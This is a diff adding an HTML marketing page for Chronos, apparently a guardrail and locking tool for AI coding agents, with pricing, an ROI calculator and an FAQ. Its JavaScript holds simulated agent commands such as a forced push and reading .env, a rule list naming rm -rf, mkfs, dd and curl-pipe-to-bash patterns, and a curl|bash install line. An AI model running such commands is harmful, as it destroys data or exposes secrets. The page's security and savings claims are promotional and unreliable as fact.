+      <span class="section-tag">POLICY FIREWALL</span>
+      <h2 class="section-title">Deterministic Governance Rule Engine</h2>
+      <p class="section-desc">
+        Explore a sample of the 80+ preconfigured threat rules running locally within Chronos. Filter by category to see how commands are evaluated.
+      </p>
+    </div>
+
+    <div class="rules-explorer">
+      <div class="rules-toolbar">
+        <div class="rule-category-filters">
+          <button class="filter-btn active" onclick="filterRules('all', this)">All Categories</button>
+          <button class="filter-btn" onclick="filterRules('git', this)">Git Protection</button>
+          <button class="filter-btn" onclick="filterRules('secrets', this)">Secrets & DLP</button>
+          <button class="filter-btn" onclick="filterRules('integrity', this)">CI & Agent Integrity</button>
+          <button class="filter-btn" onclick="filterRules('exec', this)">Dangerous Execution</button>
+        </div>
+        <span class="badge badge-cyan" id="rules-count-badge">Showing 8 Rules</span>
+      </div>
+
+      <div class="rules-list" id="rules-list-container">
+        <!-- Rendered by JS -->
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Interactive ROI & Cost Savings Calculator -->
+<section class="section" id="calculator">
+  <div class="container">
+    <div class="section-header">
+      <span class="section-tag">ROI CALCULATOR</span>
+      <h2 class="section-title">Calculate Your Organization's Savings</h2>
+      <p class="section-desc">
+        See how much your engineering team will save in LLM token costs, catastrophic merge debugging, and prevented outage downtime.
+      </p>
+    </div>
+
+    <div class="calc-card">
+      <div class="calc-inputs">
+        <div class="calc-field">
+          <div class="calc-label-row">
+            <span class="calc-label">Active Autonomous Coding Agents</span>
+            <span class="calc-val-badge" id="calc-agents-val">15 agents</span>
+          </div>
+          <input type="range" min="1" max="100" value="15" class="range-slider" id="slider-agents" oninput="updateCalc()">
+        </div>
+
+        <div class="calc-field">
+          <div class="calc-label-row">
+            <span class="calc-label">Monthly Model Spend per Agent ($)</span>
+            <span class="calc-val-badge" id="calc-spend-val">$600 / mo</span>
+          </div>
+          <input type="range" min="100" max="2500" step="50" value="600" class="range-slider" id="slider-spend" oninput="updateCalc()">
+        </div>
+
+        <div class="calc-field">
+          <div class="calc-label-row">
+            <span class="calc-label">Engineer Hourly Blended Cost ($)</span>
+            <span class="calc-val-badge" id="calc-rate-val">$120 / hr</span>
+          </div>
+          <input type="range" min="50" max="300" step="10" value="120" class="range-slider" id="slider-rate" oninput="updateCalc()">
+        </div>
+      </div>
+
+      <div class="calc-output">
+        <div class="calc-metric-group">
+          <div class="calc-metric">
+            <div class="calc-metric-val" id="calc-token-savings">$7,083</div>
+            <div class="calc-metric-label">Estimated Monthly Token Savings (78.7% Reduction)</div>
+          </div>
+
+          <div class="calc-metric">
+            <div class="calc-metric-val" id="calc-hours-saved">120 hrs</div>
+            <div class="calc-metric-label">Merge Collision & Incident Triage Saved / Mo</div>
+          </div>
+
+          <div class="calc-metric">
+            <div class="calc-metric-val" style="color:var(--cyan);" id="calc-annual-net">$257,800</div>
+            <div class="calc-metric-label">Projected Total Annual Value Delivered</div>
+          </div>
+        </div>
+
+        <div class="calc-footer-note">
+          Calculation based on measured 78.69% prompt token reduction and 8 engineering hours saved per agent per month on branch conflict resolution.
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Enterprise Pricing Section -->
+<section class="section section-alt" id="pricing">
+  <div class="container">
+    <div class="section-header">
+      <span class="section-tag">TRANSPARENT PRICING</span>
+      <h2 class="section-title">Predictable Pricing for High-Velocity Teams</h2>
+      <p class="section-desc">
+        Start free on developer machines. Upgrade when your team orchestrates parallel agent fleets across enterprise repositories.
+      </p>
+    </div>
+
+    <div class="pricing-grid">
+      <!-- Community -->
+      <div class="pricing-card">
+        <div>
+          <h3 class="tier-name">Developer</h3>
+          <p class="tier-desc">Free local control plane for individual engineers using Claude Code or OpenHands.</p>
+          <div class="tier-price-row">
+            <span class="tier-price">$0</span>
+            <span class="tier-period">forever</span>
+          </div>
+
+          <ul class="tier-features">
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              PreToolUse / PostToolUse Claude Code hooks
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              80+ core threat rules (git, secrets, shell)
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              Local tree-sitter AST symbol index (SQLite)
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              Tamper-evident local audit log
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              Local Web Dashboard (<code>chronos ui</code>)
+            </li>
+          </ul>
+        </div>
+        <a href="#quickstart" class="btn btn-outline">Install Open Source</a>
+      </div>
+
+      <!-- Team -->
+      <div class="pricing-card featured">
+        <span class="pricing-badge-popular">MOST POPULAR</span>
+        <div>
+          <h3 class="tier-name">Team</h3>
+          <p class="tier-desc">Shared sub-file AST intent locking and centralized policy governance for agent fleets.</p>
+          <div class="tier-price-row">
+            <span class="tier-price">$39</span>
+            <span class="tier-period">/ developer / month</span>
+          </div>
+
+          <ul class="tier-features">
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              <strong>Everything in Developer, plus:</strong>
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              Multi-Agent Sub-File AST Intent Lock Server
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              Centralized managed policies (tamper-proof)
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              Multi-repo AST graph sync & memory sharing
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              Shared ephemeral memory recall
+            </li>
+          </ul>
+        </div>
+        <a href="#quickstart" class="btn btn-primary">Start Team Trial</a>
+      </div>
+
+      <!-- Enterprise -->
+      <div class="pricing-card">
+        <div>
+          <h3 class="tier-name">Enterprise</h3>
+          <p class="tier-desc">Air-gapped deployment, custom OPA rego rules, GRC certification exports, and 24/7 SLA.</p>
+          <div class="tier-price-row">
+            <span class="tier-price">Custom</span>
+            <span class="tier-period">annual contract</span>
+          </div>
+
+          <ul class="tier-features">
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              <strong>Everything in Team, plus:</strong>
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              100% On-Premise / Air-Gapped Self-Hosting
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              Custom OPA Rego rules & AST-grep extensions
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              Legacy Mainframe modernizers (COBOL, RPG, PL/1)
+            </li>
+            <li class="tier-feature">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg>
+              SOC2 / ISO 27001 export & dedicated SA support
+            </li>
+          </ul>
+        </div>
+        <a href="mailto:enterprise@chronos.dev" class="btn btn-outline">Contact Architecture Team</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Frequently Asked Questions -->
+<section class="section" id="faq">
+  <div class="container">
+    <div class="section-header">
+      <span class="section-tag">COMMON INQUIRIES</span>
+      <h2 class="section-title">Frequently Asked Questions</h2>
+      <p class="section-desc">
+        Technical questions CTOs and Principal Architects ask before approving Chronos.
+      </p>
+    </div>
+
+    <div class="faq-grid">
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          Does Chronos send our proprietary code or AST data to an external LLM?
+          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+        </button>
+        <div class="faq-answer">
+          No. By default, Chronos makes zero model calls and transmits zero telemetry or source code off your machine. The AST indexer runs locally via tree-sitter compiled libraries, the rule engine runs via deterministic AST patterns and Rego, and the audit log is written to local storage. An optional embedding model can be activated locally if semantic search on vague prompts is desired.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          What is the latency impact on Claude Code and agent tool calls?
+          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+        </button>
+        <div class="faq-answer">
+          Chronos hook checks finish in under 2.5 milliseconds—orders of magnitude below Claude Code's internal hook timeout window. Because the rules are evaluated using compiled AST trees rather than model queries, developers perceive zero latency overhead while gaining airtight security.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          How does sub-file AST locking differ from traditional Git branch locking?
+          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+        </button>
+        <div class="faq-answer">
+          Git operates at the file level: if two agents modify <code>AccountService.java</code> at the same time, you risk 3-way merge conflicts or lock lockouts. Chronos parses the code into an AST and acquires an intent lock on only the targeted node (e.g., <code>AccountService.createAccount()</code>). Another agent can simultaneously edit <code>AccountService.calculateFee()</code> without conflict.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          Can an autonomous agent bypass Chronos or disable the hook?
+          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+        </button>
+        <div class="faq-answer">
+          No. Chronos installs as an immutable PreToolUse hook via Claude Code's native hook system. The rules explicitly protect <code>~/.claude/settings.json</code>, <code>.chronos/*</code>, and any hook configuration files. Any command attempting to alter or terminate the guardrail engine is caught and denied before invocation. Furthermore, Chronos enforces <code>onFailure: block</code>, meaning a crashed check safely denies execution.
+        </div>
+      </div>
+
+      <div class="faq-item">
+        <button class="faq-question" onclick="toggleFaq(this)">
+          How does Chronos integrate with enterprise CI/CD and SIEM pipelines?
+          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>
+        </button>
+        <div class="faq-answer">
+          Chronos generates a hash-chained, cryptographic JSON audit log conforming to standard event schemas. Teams can ingest this stream directly into Splunk, Datadog, or AWS CloudWatch. In CI, running <code>chronos audit verify</code> asserts that every commit produced by an AI agent originated with authorized prompt intent and passed all deterministic policy gates.
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Final Conversion Section -->
+<section class="section" id="quickstart">
+  <div class="container">
+    <div class="cta-banner">
+      <h2 class="cta-title">Deploy the Control Plane in 60 Seconds</h2>
+      <p class="cta-subtitle">
+        Protect your repositories, empower autonomous coding agents to build safely, and eliminate merge contention across your engineering org.
+      </p>
+
+      <div class="hero-cta-group" style="justify-content:center;">
+        <div class="install-bar">
+          <span class="install-command"><span class="prompt">$ </span>chronos claude install &amp;&amp; chronos ui</span>
+          <button class="copy-btn" onclick="copyText('chronos claude install && chronos ui', this)">
+            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            Copy
+          </button>
+        </div>
+        <a href="https://github.com/AdithyaK3106/Chronos" target="_blank" rel="noopener noreferrer" class="btn btn-primary btn-lg">
+          Star on GitHub
+        </a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+  <div class="container">
+    <div class="footer-top">
+      <div class="footer-brand-col">
+        <div class="brand">
+          <div class="logo-cube">C</div>
+          <div class="brand-text">
+            <span class="brand-title">CHRONOS</span>
+            <span class="brand-subtitle">AI Engineering Control Plane</span>
+          </div>
+        </div>
+        <p class="footer-tagline">
+          Guardrails, zero-path AST context, sub-file intent locking, and cryptographic auditability for autonomous software engineering.
+        </p>
+      </div>
+
+      <div>
+        <h4 class="footer-col-title">Capabilities</h4>
+        <ul class="footer-links">
+          <li><a href="#guardrails" class="footer-link">Deterministic Guardrails</a></li>
+          <li><a href="#locking" class="footer-link">AST Intent Locking</a></li>
+          <li><a href="#architecture" class="footer-link">Context Graph Engine</a></li>
+          <li><a href="#benchmarks" class="footer-link">Legacy Modernization</a></li>
+          <li><a href="#guardrails" class="footer-link">Tamper-Proof Audit</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4 class="footer-col-title">Resources</h4>
+        <ul class="footer-links">
+          <li><a href="GUIDE.md" class="footer-link">Documentation Guide</a></li>
+          <li><a href="https://github.com/AdithyaK3106/Chronos" class="footer-link">GitHub Repository</a></li>
+          <li><a href="docs/events-v1.md" class="footer-link">Event Ledger Spec</a></li>
+          <li><a href="chronos_enterprise_pitch_document.md" class="footer-link">Enterprise Pitch Doc</a></li>
+          <li><a href="chronos_control_plane.html" class="footer-link">Control Plane Web UI</a></li>
+        </ul>
+      </div>
+
+      <div>
+        <h4 class="footer-col-title">Security &amp; Legal</h4>
+        <ul class="footer-links">
+          <li><a href="LICENSE" class="footer-link">MIT License</a></li>
+          <li><a href="#faq" class="footer-link">Zero Data Retention</a></li>
+          <li><a href="#faq" class="footer-link">Local-First Architecture</a></li>
+          <li><a href="#pricing" class="footer-link">SOC2 Compliance Readiness</a></li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="footer-bottom">
+      <div>&copy; 2026 Chronos Engineering Control Plane. Open source under the MIT License.</div>
+      <div style="font-family:var(--mono);">Built for Claude Code, OpenHands, Devin &amp; Team Agents.</div>
+    </div>
+  </div>
+</footer>
+
+<!-- Interactive Scripts -->
+<script>
+// Terminal Simulation Data
+const simScenarios = {
+  chronos: [
+    { type: 'cmd', text: 'git push --force origin main' },
+    { type: 'log', tag: 'ask', text: '[Chronos] Force-push overwrites history on remote branch \'main\' [rule git.push_force; policy.rules in .chronos/config.json]' },
+    { type: 'muted', text: '↳ User prompt requested: Action blocked in automated headless run.' },
+    { type: 'cmd', text: 'cat .env' },
+    { type: 'log', tag: 'deny', text: '[Chronos] Bash command reads secret file(s): .env. Secret files are never readable by the agent. [rule secret.env_read]' },
+    { type: 'cmd', text: 'Edit AccountService.java (AST: createAccount)' },
+    { type: 'log', tag: 'lock', text: '[Chronos] Sub-file AST node \'AccountService.createAccount()\' leased to Agent-01. Other agents free to edit balanceCheck().' },
+    { type: 'log', tag: 'allow', text: '[Chronos] Context injected: 14 symbols, 2 unit tests (54,200 B). Saved 200,192 B from context window.' }
+  ],
+  unprotected: [
+    { type: 'cmd', text: 'git push --force origin main' },
+    { type: 'log', tag: 'fail', text: 'SUCCESS (Disaster): Overwrote 142 commits on remote \'main\'. All recent team PRs wiped.' },
+    { type: 'cmd', text: 'cat .env' },
+    { type: 'log', tag: 'fail', text: 'EXFILTRATED: AWS_SECRET_KEY, STRIPE_LIVE_KEY transmitted upstream to model context.' },
+    { type: 'cmd', text: 'Edit AccountService.java' },
+    { type: 'log', tag: 'fail', text: 'CONFLICT: Agent-01 and Agent-02 wrote concurrent edits. Corrupted AST syntax error on line 142.' },
+    { type: 'muted', text: '↳ Token spend: 254,392 bytes consumed greedily scanning directory tree.' }
+  ]
+};
+
+function renderSim(scenarioKey) {
+  const container = document.getElementById('sim-body');
+  container.innerHTML = '';
+  const lines = simScenarios[scenarioKey];
+
+  lines.forEach((item, idx) => {
+    const el = document.createElement('div');
+    el.className = 'terminal-line';
+    el.style.opacity = '0';
+    el.style.transform = 'translateY(4px)';
+    el.style.transition = `all 0.2s cubic-bezier(0.16, 1, 0.3, 1) ${idx * 0.08}s`;
+
+    if (item.type === 'cmd') {
+      el.innerHTML = `<span style="color:var(--cyan); font-weight:700;">$</span> <span class="term-cmd">${item.text}</span>`;
+    } else if (item.type === 'log') {
+      el.innerHTML = `<span class="term-tag ${item.tag}">${item.tag}</span> <span class="term-reason">${item.text}</span>`;
+    } else if (item.type === 'muted') {
+      el.innerHTML = `<span class="term-muted">${item.text}</span>`;
+    }
+
+    container.appendChild(el);
+    setTimeout(() => {
+      el.style.opacity = '1';
+      el.style.transform = 'translateY(0)';
+    }, 20);
+  });
+}
+
+function switchSimTab(tab) {
+  document.getElementById('tab-chronos').classList.toggle('active', tab === 'chronos');
+  document.getElementById('tab-unprotected').classList.toggle('active', tab === 'unprotected');
+  renderSim(tab);
+}
+
+// Initial simulation render
+renderSim('chronos');
+
+// Rule Explorer Data & Filtering
+const ruleSet = [
+  { id: 'git.push_force', cat: 'git', action: 'ask', desc: 'Blocks force-pushing to remote branches without explicit human sign-off.' },
+  { id: 'git.push_protected', cat: 'git', action: 'deny', desc: 'Refuses direct git pushes to protected branches like main, prod, and release.' },
+  { id: 'secret.env_read', cat: 'secrets', action: 'deny', desc: 'Strictly blocks Bash cat, head, or Read tool calls on *.env* files and secrets.' },
+  { id: 'secret.key_exposure', cat: 'secrets', action: 'deny', desc: 'Scans command strings and diffs for private RSA keys, PEM files, and cloud credentials.' },
+  { id: 'integrity.ci_tamper', cat: 'integrity', action: 'deny', desc: 'Prevents autonomous agents from modifying .github/workflows or CI security gates.' },
+  { id: 'integrity.agent_settings', cat: 'integrity', action: 'deny', desc: 'Guards ~/.claude/settings.json against agent self-modification or disabling hooks.' },
+  { id: 'exec.hidden_curl_pipe', cat: 'exec', action: 'ask', desc: 'Flags pipe-to-shell patterns like curl ... | bash or base64 decode-and-execute.' },
+  { id: 'exec.destruct_fs', cat: 'exec', action: 'deny', desc: 'Denies rm -rf, mkfs, dd, and destructive filesystem modifications.' }
+];
+
+function renderRules(filter) {
+  const container = document.getElementById('rules-list-container');
+  container.innerHTML = '';
+  const filtered = filter === 'all' ? ruleSet : ruleSet.filter(r => r.cat === filter);
+
+  document.getElementById('rules-count-badge').textContent = `Showing ${filtered.length} Rules`;
+
+  filtered.forEach(rule => {
+    const row = document.createElement('div');
+    row.className = 'rule-item';
+    row.innerHTML = `
+      <div class="rule-main">
+        <span class="rule-id">${rule.id}</span>
+        <span class="rule-desc">${rule.desc}</span>
+      </div>
+      <span class="rule-action-pill term-tag ${rule.action}">${rule.action}</span>
+    `;
+    container.appendChild(row);
+  });
+}
+
+function filterRules(category, btn) {
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  renderRules(category);
+}
+
+// Initial rules render
+renderRules('all');
+
+// ROI Calculator Logic
+function updateCalc() {
+  const agents = parseInt(document.getElementById('slider-agents').value);
+  const spend = parseInt(document.getElementById('slider-spend').value);
+  const rate = parseInt(document.getElementById('slider-rate').value);
+
+  document.getElementById('calc-agents-val').textContent = `${agents} agents`;
+  document.getElementById('calc-spend-val').textContent = `$${spend} / mo`;
+  document.getElementById('calc-rate-val').textContent = `$${rate} / hr`;
+
+  // 78.69% prompt token savings on context-heavy tasks (approx 70% of total spend)
+  const tokenSavings = Math.round(agents * spend * 0.70 * 0.7869);
+  // Average 8 hours saved per agent per month on branch conflict resolution and triage
+  const hoursSaved = agents * 8;
+  const engineeringValue = hoursSaved * rate;
+  const totalMonthlyVal = tokenSavings + engineeringValue;
+  const annualTotal = totalMonthlyVal * 12;
+
+  document.getElementById('calc-token-savings').textContent = `$${tokenSavings.toLocaleString()}`;
+  document.getElementById('calc-hours-saved').textContent = `${hoursSaved.toLocaleString()} hrs`;
+  document.getElementById('calc-annual-net').textContent = `$${annualTotal.toLocaleString()}`;
+}
+
+// Initial calculation
+updateCalc();
+
+// FAQ Accordion Toggle
+function toggleFaq(btn) {
+  const item = btn.parentElement;
+  item.classList.toggle('open');
+}
+
+// Copy Command Helpers
+function copyInstallCmd(btn) {
+  copyText('curl -fsSL https://raw.githubusercontent.com/AdithyaK3106/Chronos/master/install.sh | bash', btn);
+}
+
+function copyText(text, btn) {
+  navigator.clipboard.writeText(text).then(() => {
+    const originalText = btn.innerHTML;
+    btn.innerHTML = `<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg> Copied!`;
+    setTimeout(() => {
+      btn.innerHTML = originalText;
+    }, 2000);
+  });
+}
+</script>
+
+</body>
+</html>
